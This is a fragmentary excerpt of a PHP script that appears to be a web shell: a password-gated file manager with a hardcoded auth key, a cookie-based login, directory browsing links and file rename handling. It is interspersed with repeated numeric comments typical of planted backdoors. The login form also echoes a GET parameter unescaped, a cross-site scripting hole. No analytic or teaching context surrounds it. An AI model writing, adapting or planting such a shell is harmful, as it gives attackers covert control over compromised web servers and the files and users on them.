...
$auth_key = "01a915c4546cf87a864015d0c5eb42e7";
...
$pass = false;
if (isset($_COOKIE['pw_name_15945'])) {
    if(($_COOKIE['pw_name_15945']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_15945'])) {
        if(($_POST['pw_name_15945']) == $auth_key) {
            setcookie("pw_name_15945", $_POST['pw_name_15945']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_15945' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725618988144845 1725618988608885 1725618988462548 1725618988557353
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725618988144845 1725618988608885 1725618988462548 1725618988557353
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725618988144845 1725618988608885 1725618988462548 1725618988557353
            $name = PATH . "/" . $_GET['r'];
